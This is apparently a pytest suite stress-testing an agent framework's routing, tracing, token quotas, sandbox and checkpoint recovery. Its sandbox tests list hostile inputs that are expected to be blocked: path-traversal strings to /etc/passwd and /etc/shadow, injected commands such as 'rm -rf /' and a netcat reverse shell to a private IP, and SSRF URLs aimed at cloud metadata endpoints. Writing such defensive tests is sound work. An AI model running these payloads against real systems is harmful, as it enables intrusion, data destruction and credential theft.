"""Adversarial Coverage Hardening (Tier 5) System-Wide Robustness and Concurrency Stress Suite.

Empirically stress-tests cross-system interactions across all 4 AgentMesh pillars:
1. High-throughput multi-agent mesh routing with simultaneous node crashes,
   rapid dynamic discovery updates, and circuit breaker flapping.
2. Cross-agent W3C distributed trace propagation under deep async nesting (60+ spans)
   with token quota enforcement under heavy race conditions.
3. Capability security sandbox tri-vector penetration under adversarial workloads
   (obfuscated traversal, complex subcommands, IPv6/NAT64 evasion).
4. Autonomous recovery under chaotic database disruptions and corrupted checkpoint files.
"""

from __future__ import annotations

import asyncio
import concurrent.futures
import json
import os
import shutil
import time
import uuid
from pathlib import Path
from typing import Any

import pytest

from agentmesh.engine.activity import (
    execute_activity,
)
from agentmesh.engine.checkpoint import (
    CheckpointManager,
    StateSeparationError,
)
from agentmesh.engine.graph import Graph
from agentmesh.engine.memoizer import ActivityMemoizer
from agentmesh.engine.replay import (
    CryptographicIntegrityError,
    EventReplayer,
    ResumptionPlanner,
)
from agentmesh.engine.state import (
    EventType,
    State,
)
from agentmesh.mesh.a2a import (
    AgentCapability,
    AgentCard,
)
from agentmesh.mesh.discovery import (
    ServiceRegistry,
)
from agentmesh.mesh.router import (
    AgentEndpoint,
    CircuitBreaker,
    CircuitState,
    MeshRouter,
)
from agentmesh.security.policy import (
    CapabilityPolicy,
    CommandRule,
)
from agentmesh.security.sandbox import (
    PermissionDeniedError,
    SecuritySandbox,
)
from agentmesh.telemetry.tracer import (
    AgentTracer,
    AuditLogger,
    QuotaExceededError,
    TokenTracker,
)
from agentmesh.telemetry.w3c import (
    TraceState,
    extract_w3c_trace_context,
    validate_traceparent,
)

STRESS_STATE_DIR_BASE = "/tmp/agentmesh/tier5_system_stress"


@pytest.fixture(autouse=True)
def clean_tier5_stress_dir(monkeypatch: pytest.MonkeyPatch) -> Any:
    """Ensure clean isolated state directory outside repository tree."""
    unique_run = uuid.uuid4().hex[:8]
    test_dir = f"{STRESS_STATE_DIR_BASE}_{unique_run}"
    monkeypatch.setenv("AGENTMESH_STATE_DIR", test_dir)
    os.makedirs(test_dir, exist_ok=True)
    yield test_dir
    if os.path.exists(test_dir):
        shutil.rmtree(test_dir, ignore_errors=True)


# ==============================================================================
# Pillar 1: High-Throughput Mesh Routing, Node Crashes & Dynamic Churn
# ==============================================================================


class TestMeshRoutingConcurrencyAndFaultTolerance:
    """Stress-tests multi-agent mesh routing under high concurrency, node crashes, and churn."""

    @pytest.mark.asyncio
    async def test_high_throughput_concurrent_routing_with_node_crashes_and_sub_5ms_trip(
        self,
    ) -> None:
        """Verify high concurrency routing with node crash triggers sub-5ms circuit trip and fallback."""
        router = MeshRouter()
        primary_calls = 0
        fallback_calls = 0

        async def primary_handler(payload: dict[str, Any]) -> dict[str, Any]:
            nonlocal primary_calls
            primary_calls += 1
            if primary_calls > 10:
                raise RuntimeError("Simulated node crash mid-stream")
            return {"status": "ok", "agent": "primary", "data": payload}

        async def fallback_handler(payload: dict[str, Any]) -> dict[str, Any]:
            nonlocal fallback_calls
            fallback_calls += 1
            return {"status": "fallback_ok", "agent": "fallback", "data": payload}

        primary_ep = AgentEndpoint(
            agent_id="agent-primary-node",
            role="processor",
            weight=100,
        )
        fallback_ep = AgentEndpoint(
            agent_id="agent-fallback-node",
            role="processor_fallback",
            weight=100,
        )

        router.register_endpoint(
            endpoint=primary_ep,
            handler=primary_handler,
            fallback_agent_id="agent-fallback-node",
            failure_threshold=2,
            recovery_timeout=5.0,
            half_open_success_threshold=2,
        )
        router.register_endpoint(
            endpoint=fallback_ep,
            handler=fallback_handler,
            failure_threshold=5,
        )

        async def send_request(idx: int) -> dict[str, Any]:
            res = await router.route_and_call("agent-primary-node", {"req_id": idx})
            return res

        start_time = time.perf_counter()
        tasks = [asyncio.create_task(send_request(i)) for i in range(50)]
        results = await asyncio.gather(*tasks)
        elapsed_sec = time.perf_counter() - start_time

        assert len(results) == 50
        assert primary_calls >= 10
        assert fallback_calls >= 35

        cb = router.circuit_breakers["agent-primary-node"]
        assert cb.state == CircuitState.OPEN

        t0 = time.perf_counter()
        cb.record_failure()
        trip_latency_ms = (time.perf_counter() - t0) * 1000.0
        assert trip_latency_ms < 5.0
        assert elapsed_sec < 2.0

    @pytest.mark.asyncio
    async def test_rapid_dynamic_discovery_churn_under_continuous_traffic(
        self,
    ) -> None:
        """Verify thread-safe capability routing while discovery registry undergoes rapid churn."""
        registry = ServiceRegistry()
        router = MeshRouter(discovery_registry=registry)

        async def echo_handler(payload: dict[str, Any]) -> dict[str, Any]:
            return {"response": "echo", "payload": payload}

        for i in range(3):
            aid = f"worker-{i}"
            card = AgentCard(
                agent_id=aid,
                name=f"Worker {i}",
                description="Worker agent",
                version="1.0.0",
                capabilities=[
                    AgentCapability(
                        name="data_processing",
                        description="Processes raw payloads",
                        version="1.0.0",
                    )
                ],
            )
            registry.register(card=card, weight=100)
            ep = AgentEndpoint(agent_id=aid, role="worker", weight=100)
            router.register_endpoint(endpoint=ep, handler=echo_handler)

        stop_churn = asyncio.Event()

        async def churn_registry() -> None:
            counter = 10
            while not stop_churn.is_set():
                new_aid = f"worker-{counter}"
                new_card = AgentCard(
                    agent_id=new_aid,
                    name=f"Dynamic Worker {counter}",
                    description="Dynamic agent",
                    version="1.0.0",
                    capabilities=[
                        AgentCapability(
                            name="data_processing",
                            description="Processes raw payloads",
                            version="1.0.0",
                        )
                    ],
                )
                registry.register(card=new_card, weight=50)
                ep = AgentEndpoint(agent_id=new_aid, role="worker", weight=50)
                router.register_endpoint(endpoint=ep, handler=echo_handler)

                old_aid = f"worker-{counter - 1}"
                registry.deregister(old_aid)
                router.endpoints.pop(old_aid, None)

                counter += 1
                await asyncio.sleep(0.005)

        churn_task = asyncio.create_task(churn_registry())

        async def query_worker(req_idx: int) -> dict[str, Any]:
            return await router.route_by_capability(
                "data_processing", {"query_id": req_idx}
            )

        query_tasks = [asyncio.create_task(query_worker(i)) for i in range(40)]
        query_results = await asyncio.gather(*query_tasks)

        stop_churn.set()
        await churn_task

        assert len(query_results) == 40
        for r in query_results:
            assert r["response"] == "echo"

    @pytest.mark.asyncio
    async def test_circuit_breaker_rapid_flapping_recovery_probe(self) -> None:
        """Verify circuit breaker accurately handles rapid flapping between OPEN, HALF_OPEN, and CLOSED."""
        cb = CircuitBreaker(
            failure_threshold=2,
            recovery_timeout=0.03,
            half_open_success_threshold=3,
        )

        assert cb.state == CircuitState.CLOSED
        assert cb.can_execute() is True

        cb.record_failure()
        assert cb.state == CircuitState.CLOSED
        assert cb.failure_count == 1

        t0 = time.perf_counter()
        cb.record_failure()
        trip_time_ms = (time.perf_counter() - t0) * 1000.0
        assert cb.state == CircuitState.OPEN
        assert trip_time_ms < 5.0
        assert cb.can_execute() is False

        await asyncio.sleep(0.04)
        assert cb.can_execute() is True
        assert cb.state == CircuitState.HALF_OPEN

        cb.record_failure()
        assert cb.state == CircuitState.OPEN
        assert cb.can_execute() is False

        await asyncio.sleep(0.04)
        assert cb.can_execute() is True
        assert cb.state == CircuitState.HALF_OPEN

        cb.record_success()
        assert cb.state == CircuitState.HALF_OPEN
        assert cb.consecutive_successes == 1

        cb.record_success()
        assert cb.state == CircuitState.HALF_OPEN
        assert cb.consecutive_successes == 2

        cb.record_success()
        assert cb.state == CircuitState.CLOSED
        assert cb.consecutive_successes == 0
        assert cb.failure_count == 0
        assert cb.can_execute() is True

    @pytest.mark.asyncio
    async def test_circular_fallback_prevention_under_catastrophic_cascade(
        self,
    ) -> None:
        """Verify circular fallback topology raises RuntimeError immediately without infinite recursion."""
        router = MeshRouter()

        async def failing_node(payload: dict[str, Any]) -> Any:
            raise RuntimeError("Permanent node outage")

        for name in ["node_alpha", "node_beta", "node_gamma"]:
            ep = AgentEndpoint(agent_id=name, role="cluster_node", weight=100)
            router.register_endpoint(
                endpoint=ep,
                handler=failing_node,
                failure_threshold=1,
            )

        router.fallbacks["node_alpha"] = "node_beta"
        router.fallbacks["node_beta"] = "node_gamma"
        router.fallbacks["node_gamma"] = "node_alpha"

        with pytest.raises(RuntimeError) as exc_info:
            await router.route_and_call("node_alpha", {"data": "test_ping"})

        err_str = str(exc_info.value)
        assert "Fallback cycle detected" in err_str
        assert "node_alpha -> node_beta -> node_gamma -> node_alpha" in err_str


# ==============================================================================
# Pillar 2: Deep W3C Trace Propagation & High-Concurrency Token Quota
# ==============================================================================


class TestDeepTracePropagationAndTokenConcurrency:
    """Stress-tests W3C trace propagation across 60+ async spans and thread-safe quota enforcement."""

    @pytest.mark.asyncio
    async def test_deep_async_nested_spans_w3c_propagation_60_levels(self) -> None:
        """Verify W3C traceparent and context integrity across 60 deep async nested spans."""
        tracer = AgentTracer()
        root_ctx = tracer.get_or_create_context(budget_limit=100000)
        initial_headers = root_ctx.to_w3c_headers()
        max_depth = 60
        span_records: list[dict[str, str]] = []

        async def execute_hop(
            depth: int, headers: dict[str, str]
        ) -> dict[str, str]:
            ctx = tracer.create_context_from_w3c(headers)
            span = ctx.start_span(
                name=f"hop_span_{depth}",
                attributes={"depth": depth, "timestamp_ns": time.time_ns()},
            )
            ctx.record_token_usage(prompt=5, completion=5, model="default")
            span.finish(status="OK")

            span_records.append(
                {
                    "depth": str(depth),
                    "trace_id": ctx.trace_id,
                    "span_id": span.span_id,
                    "parent_span_id": span.parent_span_id or "",
                }
            )

            child_headers = ctx.to_w3c_headers(current_span_id=span.span_id)
            if depth < max_depth:
                await asyncio.sleep(0.0001)
                return await execute_hop(depth + 1, child_headers)
            return child_headers

        final_headers = await execute_hop(1, initial_headers)

        assert len(span_records) == 60
        root_trace_id = root_ctx.trace_id

        for record in span_records:
            assert record["trace_id"] == root_trace_id
            assert len(record["trace_id"]) == 32
            assert len(record["span_id"]) == 16

        for i in range(1, 60):
            current = span_records[i]
            prev = span_records[i - 1]
            assert current["parent_span_id"] == prev["span_id"]

        tp_val, _ = extract_w3c_trace_context(final_headers)
        assert tp_val is not None
        version, t_id, s_id, flags = validate_traceparent(tp_val)
        assert version == "00"
        assert t_id == root_trace_id
        assert s_id == span_records[-1]["span_id"]
        assert flags == "01"

    def test_token_quota_enforcement_under_high_concurrency_race(self) -> None:
        """Verify atomic quota enforcement under multithreaded race condition with zero budget leakage."""
        budget_limit = 2500
        tracker = TokenTracker(budget_limit=budget_limit)

        threads_count = 50
        tokens_per_request = 100
        # Total requested = 50 * 100 = 5000 tokens (exactly 2x budget)

        success_count = 0
        quota_exceeded_count = 0
        lock = concurrent.futures.ThreadPoolExecutor(max_workers=25)

        def worker_call() -> bool:
            nonlocal success_count, quota_exceeded_count
            try:
                tracker.record(prompt_tokens=60, completion_tokens=40)
                return True
            except QuotaExceededError:
                return False

        with lock as executor:
            futures = [executor.submit(worker_call) for _ in range(threads_count)]
            for fut in concurrent.futures.as_completed(futures):
                if fut.result():
                    success_count += 1
                else:
                    quota_exceeded_count += 1

        assert tracker.total_tokens <= budget_limit
        assert tracker.total_tokens == budget_limit
        assert success_count == (budget_limit // tokens_per_request)
        assert quota_exceeded_count == (threads_count - success_count)
        assert tracker.prompt_tokens == success_count * 60
        assert tracker.completion_tokens == success_count * 40

        with pytest.raises(QuotaExceededError) as exc_info:
            tracker.record(prompt_tokens=1, completion_tokens=0)
        assert exc_info.value.current_tokens == budget_limit

    def test_multitenant_tracestate_propagation_and_overflow_limits(self) -> None:
        """Verify RFC W3C tracestate 32-member and 512-character bounds enforcement."""
        state = TraceState()
        for i in range(50):
            state = state.set(f"tenant_{i:02d}", f"val_{i:04d}")

        formatted = state.format()
        assert len(state) <= 32
        assert len(formatted) <= 512
        assert state.get("tenant_49") == "val_0049"

    def test_audit_logger_concurrent_multithreaded_burst(
        self, clean_tier5_stress_dir: str
    ) -> None:
        """Verify structured AuditLogger handles concurrent high-throughput append operations safely."""
        log_path = Path(clean_tier5_stress_dir) / "audit_stress.jsonl"
        logger = AuditLogger(log_file=log_path)

        def log_worker(worker_id: int) -> None:
            for seq in range(40):
                logger.log_tool_call(
                    trace_id=f"trace_{worker_id:04d}_{seq:04d}",
                    span_id=f"span_{worker_id:04d}",
                    actor_id=f"agent_worker_{worker_id}",
                    tool_name="financial_risk_eval",
                    arguments={"score": seq * 10},
                    status="SUCCESS",
                )

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(log_worker, i) for i in range(25)]
            for fut in concurrent.futures.as_completed(futures):
                fut.result()

        records = logger.get_records()
        assert len(records) == 25 * 40
        assert log_path.exists()

        lines = log_path.read_text(encoding="utf-8").strip().split("\n")
        assert len(lines) == 25 * 40
        for line in lines:
            parsed = json.loads(line)
            assert parsed["event_type"] == "TOOL_CALL"
            assert parsed["target"] == "financial_risk_eval"


# ==============================================================================
# Pillar 3: Capability Security Sandbox Tri-Vector Penetration
# ==============================================================================


class TestCapabilitySandboxTriVectorPenetration:
    """Adversarially attacks the capability security sandbox across filesystem, command, and network vectors."""

    @pytest.fixture
    def strict_sandbox(self, clean_tier5_stress_dir: str) -> dict[str, Any]:
        """Provisions a sandbox with strictly confined read, write, and execute boundaries."""
        base_dir = Path(clean_tier5_stress_dir)
        read_root = base_dir / "safe_read"
        write_root = base_dir / "safe_write"
        exec_root = base_dir / "safe_bin"
        read_root.mkdir(parents=True, exist_ok=True)
        write_root.mkdir(parents=True, exist_ok=True)
        exec_root.mkdir(parents=True, exist_ok=True)

        sample_doc = read_root / "confidential.txt"
        sample_doc.write_text("RESTRICTED_DATA", encoding="utf-8")

        policy = CapabilityPolicy(
            policy_name="tier5_adversarial_policy",
            allow_network=False,
            allowed_read_paths=[str(read_root)],
            allowed_write_paths=[str(write_root)],
            allowed_execute_paths=[str(exec_root)],
            allowed_commands={"echo", "cat", "grep", "git"},
            command_rules=[
                CommandRule(
                    executable="git",
                    allowed_subcommands={"status", "diff"},
                    blocked_flags={"--exec-path", "-c", "--upload-pack"},
                    max_args=4,
                )
            ],
        )
        sandbox = SecuritySandbox(policy=policy)
        return {
            "sandbox": sandbox,
            "read_root": read_root,
            "write_root": write_root,
            "exec_root": exec_root,
            "sample_doc": sample_doc,
        }

    def test_sandbox_obfuscated_filesystem_traversal_penetration(
        self, strict_sandbox: dict[str, Any]
    ) -> None:
        """Verify 100% interception of obfuscated traversal, null bytes, and mode violations."""
        sandbox: SecuritySandbox = strict_sandbox["sandbox"]
        read_root: Path = strict_sandbox["read_root"]

        adversarial_paths = [
            f"{read_root}/../safe_read/confidential.txt\x00/../../etc/passwd",
            f"{read_root}/confidential.txt%00.png",
            f"{read_root}/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            f"{read_root}/..%2f..%2fetc%2fpasswd",
            f"{read_root}/../../../../etc/passwd",
            f"{read_root}\\..\\..\\etc\\passwd",
            "/etc/passwd",
            "/var/run/docker.sock",
            "/private/etc/hosts",
            "",
            "   ",
        ]

        for path in adversarial_paths:
            with pytest.raises(PermissionDeniedError):
                sandbox.validate_file_access(path, mode="r")

        # Mode violations: write to read-only path
        with pytest.raises(PermissionDeniedError):
            sandbox.validate_file_access(str(strict_sandbox["sample_doc"]), mode="w")

        # Mode violations: execute on read-only path
        with pytest.raises(PermissionDeniedError):
            sandbox.validate_file_access(str(strict_sandbox["sample_doc"]), mode="x")

        # Valid read path passes
        valid_res = sandbox.validate_file_access(
            str(strict_sandbox["sample_doc"]), mode="r"
        )
        assert valid_res.exists()

    def test_sandbox_command_injection_and_complex_subcommands(
        self, strict_sandbox: dict[str, Any]
    ) -> None:
        """Verify 100% interception of shell metacharacter chaining and subcommand violations."""
        sandbox: SecuritySandbox = strict_sandbox["sandbox"]

        chained_attacks = [
            "echo hello; rm -rf /",
            "cat /etc/passwd && id",
            "grep root /etc/passwd | nc -e /bin/sh 10.0.0.1 4444",
            "cat $(whoami)",
            "cat `id`",
            "echo compromised > /tmp/hacked",
            "echo compromised >> /tmp/hacked",
            "cat < /etc/shadow",
            "/bin/echo hello",
            "../../bin/echo hello",
        ]

        for cmd in chained_attacks:
            with pytest.raises(PermissionDeniedError):
                sandbox.validate_command(cmd)

        # Subcommand rule enforcement for git
        with pytest.raises(PermissionDeniedError):
            sandbox.validate_command("git push origin main")

        with pytest.raises(PermissionDeniedError):
            sandbox.validate_command("git -c foo=bar status")

        with pytest.raises(PermissionDeniedError):
            sandbox.validate_command("git --exec-path=/bin status")

        with pytest.raises(PermissionDeniedError):
            sandbox.validate_command(
                "git status arg1 arg2 arg3 arg4 arg5"
            )  # exceeds max_args=4

        # Valid git command passes
        valid_cmd = sandbox.validate_command("git status")
        assert valid_cmd[0] == "git"
        assert valid_cmd[1] == "status"

    def test_sandbox_network_ssrf_ipv6_nat64_and_evasion(
        self, strict_sandbox: dict[str, Any]
    ) -> None:
        """Verify 100% interception of IPv6, NAT64, cloud metadata, and loopback SSRF vectors."""
        sandbox: SecuritySandbox = strict_sandbox["sandbox"]

        ssrf_targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://[::ffff:169.254.169.254]/computeMetadata/v1/",
            "http://[::ffff:127.0.0.1]:8080/",
            "http://[64:ff9b::169.254.169.254]/",
            "http://[64:ff9b::127.0.0.1]/",
            "http://[::169.254.169.254]/",
            "http://[::127.0.0.1]/",
            "http://[::1]:9000/",
            "http://[fec0::1]/",
            "http://[fc00::1]/",
            "http://[fd12:3456:789a::1]/",
            "http://metadata.google.internal/",
            "http://metadata/",
            "http://instance-data/",
            "http://localhost:8000/",
            "http://127.0.0.1:3000/",
            "http://10.0.0.1/",
            "http://192.168.1.1/",
        ]

        for target in ssrf_targets:
            with pytest.raises(PermissionDeniedError):
                sandbox.validate_network(target)

    def test_sandbox_tool_call_deep_argument_inspection_penetration(
        self, strict_sandbox: dict[str, Any]
    ) -> None:
        """Verify deep inspection of nested tool call arguments blocks hidden SSRF and path traversal."""
        sandbox: SecuritySandbox = strict_sandbox["sandbox"]

        adversarial_tool_calls = [
            (
                "http_request",
                {"destination": "http://[::ffff:169.254.169.254]/metadata"},
            ),
            (
                "database_export",
                {"target_path": "/etc/shadow", "mode": "w"},
            ),
            (
                "git_tool",
                {"command": "git push origin main"},
            ),
            (
                "batch_fetcher",
                {"endpoint": "http://[64:ff9b::169.254.169.254]/"},
            ),
            (
                "shell_runner",
                {"cmd": "echo test; rm -rf /"},
            ),
            (
                "metadata_probe",
                {"url": "http://169.254.169.254/latest/meta-data/"},
            ),
        ]

        for tool_name, args in adversarial_tool_calls:
            with pytest.raises(PermissionDeniedError):
                sandbox.validate_tool_call(tool_name, args)


# ==============================================================================
# Pillar 4: Autonomous Recovery under Chaotic Disruptions & Corrupt State
# ==============================================================================


class TestAutonomousRecoveryUnderChaoticDisruptions:
    """Stress-tests autonomous DAG breakpoint resumption, checkpoint corruption defense, and state separation."""

    def test_recovery_detects_corrupted_checkpoint_manifest(
        self, clean_tier5_stress_dir: str
    ) -> None:
        """Verify CheckpointManager rejects tampered event counts, last_hash mismatches, and syntax errors."""
        ckpt_mgr = CheckpointManager(base_dir=clean_tier5_stress_dir)
        state = State(workflow_id="wf_corrupt_test")
        state.append_event(EventType.NODE_START, node_id="node_a")
        state.append_event(
            EventType.NODE_COMPLETE,
            node_id="node_a",
            payload={"out": "data"},
        )
        saved_file = ckpt_mgr.save_checkpoint(state, label="baseline")

        with open(saved_file, "r", encoding="utf-8") as f:
            raw_data = json.load(f)

        # Corruption 1: events_count tampered to mismatch events length
        corrupt_data1 = dict(raw_data)
        corrupt_data1["events_count"] = 999
        corrupt_file1 = (
            Path(clean_tier5_stress_dir) / "wf_corrupt_test" / "ckpt_tampered_count.json"
        )
        with open(corrupt_file1, "w", encoding="utf-8") as f:
            json.dump(corrupt_data1, f)

        with pytest.raises(CryptographicIntegrityError) as exc_info:
            ckpt_mgr.load_from_file(str(corrupt_file1))
        assert "Checkpoint event count mismatch" in str(exc_info.value)

        # Corruption 2: last_hash tampered
        corrupt_data2 = dict(raw_data)
        corrupt_data2["last_hash"] = "0" * 64
        corrupt_file2 = (
            Path(clean_tier5_stress_dir) / "wf_corrupt_test" / "ckpt_tampered_hash.json"
        )
        with open(corrupt_file2, "w", encoding="utf-8") as f:
            json.dump(corrupt_data2, f)

        with pytest.raises(CryptographicIntegrityError) as exc_info2:
            ckpt_mgr.load_from_file(str(corrupt_file2))
        assert "Checkpoint tail event hash mismatch" in str(exc_info2.value)

        # Corruption 3: truncated invalid JSON syntax (crash during write)
        corrupt_file3 = (
            Path(clean_tier5_stress_dir) / "wf_corrupt_test" / "ckpt_truncated.json"
        )
        with open(corrupt_file3, "w", encoding="utf-8") as f:
            f.write('{"workflow_id": "wf_corrupt_test", "events": [')

        with pytest.raises(json.JSONDecodeError):
            ckpt_mgr.load_from_file(str(corrupt_file3))

    @pytest.mark.asyncio
    async def test_recovery_fallback_to_prior_checkpoint_when_latest_corrupt(
        self, clean_tier5_stress_dir: str
    ) -> None:
        """Verify workflow recovery falls back to earlier uncorrupted checkpoint when latest is damaged."""
        ckpt_mgr = CheckpointManager(base_dir=clean_tier5_stress_dir)
        wf_id = "wf_fallback_recovery"
        state = State(workflow_id=wf_id)

        # Step 1: Execute step_1
        state.append_event(EventType.NODE_START, node_id="step_1")
        state.set("progress", 1)
        state.append_event(
            EventType.NODE_COMPLETE,
            node_id="step_1",
            payload={"step": 1},
        )
        ckpt_mgr.save_checkpoint(state, label="step_1_ok")

        # Step 2: Execute step_2
        state.append_event(EventType.NODE_START, node_id="step_2")
        state.set("progress", 2)
        state.append_event(
            EventType.NODE_COMPLETE,
            node_id="step_2",
            payload={"step": 2},
        )
        ckpt_mgr.save_checkpoint(state, label="step_2_ok")

        # Step 3: Checkpoint 3 becomes corrupted on disk
        ckpt_paths = ckpt_mgr.list_checkpoints(wf_id)
        assert len(ckpt_paths) == 2
        latest_path = Path(ckpt_paths[-1])
        with open(latest_path, "w", encoding="utf-8") as f:
            f.write("CORRUPTED_DISK_SECTOR_DATA_NULL_BYTES\x00\x00")

        # Resilient loader: iterate checkpoints in reverse and load first valid one
        valid_state: State | None = None
        for p in reversed(ckpt_mgr.list_checkpoints(wf_id)):
            try:
                valid_state = ckpt_mgr.load_from_file(p)
                break
            except (json.JSONDecodeError, CryptographicIntegrityError):
                continue

        assert valid_state is not None
        assert valid_state.get("progress") == 1  # Successfully recovered step 1 state

        # Now resume from step 2 and finish workflow
        graph = Graph("resilient_chain")
        step2_ran = False
        step3_ran = False

        def step2_fn(st: State) -> None:
            nonlocal step2_ran
            step2_ran = True
            st.set("progress", 2)

        def step3_fn(st: State) -> None:
            nonlocal step3_ran
            step3_ran = True
            st.set("progress", 3)

        graph.add_node("step_2", step2_fn)
        graph.add_node("step_3", step3_fn)
        graph.add_edge("step_2", "step_3")
        graph.set_entry_point("step_2")
        graph.set_finish_point("step_3")

        final_state = await graph.run(
            valid_state,
            checkpoint_manager=ckpt_mgr,
            start_from_node="step_2",
        )

        assert step2_ran is True
        assert step3_ran is True
        assert final_state.get("progress") == 3

    @pytest.mark.asyncio
    async def test_autonomous_recovery_zero_duplicate_activity_and_tokens(
        self, clean_tier5_stress_dir: str
    ) -> None:
        """Verify crash-recovery achieves <200ms latency and strictly 0 duplicate external activity tokens."""
        ckpt_mgr = CheckpointManager(base_dir=clean_tier5_stress_dir)
        wf_id = "wf_zero_duplicate_audit"
        tracer = AgentTracer()
        ctx = tracer.get_or_create_context(trace_id="a1b2c3d4e5f60718293a4b5c6d7e8f90")

        external_call_count = 0
        total_tokens_billed = 0

        def non_deterministic_llm(query: str) -> dict[str, Any]:
            nonlocal external_call_count, total_tokens_billed
            external_call_count += 1
            tokens = 150
            total_tokens_billed += tokens
            ctx.record_token_usage(prompt=100, completion=50, model="gpt-4o")
            return {"query": query, "embedding": [0.1, 0.2, 0.3], "tokens": tokens}

        graph = Graph("financial_analysis_graph")

        async def node_analyze(st: State) -> None:
            result = await execute_activity(
                "non_deterministic_llm",
                non_deterministic_llm,
                args=("audit_financial_ledger_2026",),
            )
            st.set("analysis_result", result)

        crash_triggered = False

        def node_crash(st: State) -> None:
            nonlocal crash_triggered
            if not crash_triggered:
                crash_triggered = True
                raise RuntimeError("Simulated OOM / Process Kill in Node 2")
            st.set("status", "RECOVERED_SUCCESS")

        graph.add_node("node_analyze", node_analyze)
        graph.add_node("node_crash", node_crash)
        graph.add_edge("node_analyze", "node_crash")
        graph.set_entry_point("node_analyze")
        graph.set_finish_point("node_crash")

        initial_state = State(workflow_id=wf_id)
        memoizer = ActivityMemoizer()

        with pytest.raises(RuntimeError, match="Simulated OOM"):
            await graph.run(
                initial_state,
                checkpoint_manager=ckpt_mgr,
                memoizer=memoizer,
                tracer=tracer,
            )

        ckpt_mgr.save_checkpoint(initial_state, label="post_crash")

        assert external_call_count == 1
        assert total_tokens_billed == 150
        assert ctx.total_tokens_consumed == 150

        # Autonomous Resumption Phase
        t0 = time.perf_counter()
        loaded_state = ckpt_mgr.load_latest_checkpoint(wf_id)
        assert loaded_state is not None

        plan = ResumptionPlanner.plan_resumption(graph, loaded_state)
        resumption_latency_ms = (time.perf_counter() - t0) * 1000.0

        assert resumption_latency_ms < 200.0  # Acceptance criterion: < 200ms
        assert plan.resume_node == "node_crash"
        assert plan.is_resuming_interrupted_node is True

        # Re-run from recovery
        recovered_memoizer = ActivityMemoizer()
        recovered_memoizer.populate_from_events(loaded_state.events)

        final_state = await graph.run(
            loaded_state,
            checkpoint_manager=ckpt_mgr,
            memoizer=recovered_memoizer,
            tracer=tracer,
            start_from_node=plan.resume_node,
        )

        assert final_state.get("status") == "RECOVERED_SUCCESS"
        assert external_call_count == 1  # ZERO duplicate external activities
        assert total_tokens_billed == 150  # ZERO duplicate tokens billed
        assert ctx.total_tokens_consumed == 150

        is_valid, err = EventReplayer.verify_event_chain(final_state.events)
        assert is_valid is True
        assert err is None

    def test_strict_physical_state_separation_rejection(self) -> None:
        """Verify CheckpointManager strictly forbids state storage inside repository tree."""
        repo_root = CheckpointManager._detect_repo_root()
        assert repo_root is not None

        forbidden_paths = [
            repo_root,
            repo_root / "checkpoints",
            repo_root / "agentmesh" / "state",
            repo_root / "tests" / "test_state",
            repo_root / "nested" / "dir" / "state.db",
        ]

        for forbidden in forbidden_paths:
            with pytest.raises(StateSeparationError) as exc_info:
                CheckpointManager.validate_state_dir(forbidden)
            assert "Physical State Separation Violation" in str(exc_info.value)
